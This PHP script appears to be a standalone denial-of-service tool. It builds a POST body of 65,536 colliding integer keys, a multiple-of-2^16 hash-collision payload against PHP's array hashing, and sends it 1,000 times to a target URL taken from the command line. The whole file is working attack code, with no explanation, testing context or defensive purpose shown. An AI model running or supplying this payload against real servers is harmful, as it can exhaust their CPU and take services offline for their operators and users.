
<?php 
$size = pow(2, 16); 
$data = ''; 
for ($key = 0, $maxKey = ($size - 1) * $size; $key <= $maxKey; $key += $size) { 
$data .= $key.'=&'; 
} 
$url = $argv[1]; 
$rs = array(); 
$ch = curl_init(); 
curl_setopt($ch, CURLOPT_HEADER,0); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($ch, CURLOPT_URL, $url); 
curl_setopt($ch, CURLOPT_POST, 1); 
curl_setopt($ch, CURLOPT_POSTFIELDS, $data); 
for ($i=0; $i<1000; ++$i) 
{ 
curl_exec($ch); 
} 
curl_close($ch); 
?> 